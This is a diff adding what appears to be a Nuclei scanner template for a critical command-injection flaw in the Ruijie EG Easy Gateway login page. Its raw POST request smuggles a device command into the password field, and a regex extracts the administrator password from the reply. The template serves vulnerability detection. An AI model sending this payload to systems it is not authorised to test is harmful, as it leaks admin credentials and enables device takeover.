@@ -1,0 +1,46 @@
+http:
+    - extractors:
+        - group: 1
+          regex:
+            - admin ([a-zA-Z0-9#@]+)",
+          type: regex
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"data":'
+            - '"status":1'
+            - admin
+        - part: header
+          type: word
+          words:
+            - text/json
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /login.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          username=admin&password=admin?show+webmaster+user
+id: ruijie-eg-login-rce
+info:
+    author: pikpikcu,pdteam
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.
+    metadata:
+        max-request: 1
+    name: Ruijie EG Easy Gateway - Remote Command Execution
+    reference:
+        - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
+        - https://www.ruijienetworks.com
+    severity: critical
+    tags:
+        - ruijie
